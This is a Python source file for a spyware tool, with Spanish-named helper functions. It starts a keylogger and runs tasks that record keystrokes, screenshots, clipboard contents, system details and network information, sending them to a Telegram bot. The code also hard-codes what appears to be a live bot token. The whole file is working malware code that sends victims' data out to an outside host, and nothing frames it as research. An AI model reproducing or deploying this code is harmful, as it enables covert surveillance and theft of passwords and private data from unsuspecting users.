import asyncio
import logging
from telegram import Bot
from funciones_asyncronas import registro_errores, capturar_teclas, capture_screenshots, log_clipboard, especificaciones_sistema, informacion_red
from pynput import keyboard as kb
from keylogger import detect_k, release_k
import pyautogui
from pyautogui import pyscreeze

async def main():
    logging.basicConfig(filename="errors.log", level=logging.ERROR, format="%(asctime)s - %(message)s")
    
    try:
        bot = Bot(token="7348242610:AAG4Jyl41n0DqCX5AYKskb3AXkJXB2IDJso")
        
        listener = kb.Listener(on_press=detect_k, on_release=release_k)
        listener.start()

        await asyncio.gather(
            capturar_teclas(bot),
            capture_screenshots(bot),
            log_clipboard(bot),
            especificaciones_sistema(bot),
            informacion_red(bot)
        )
        print("Tasks launched successfully.")
    except Exception as e:
        registro_errores(f"Initialization error: {e}")
        print(f"Error: {e}")

if __name__ == "__main__":
    asyncio.run(main())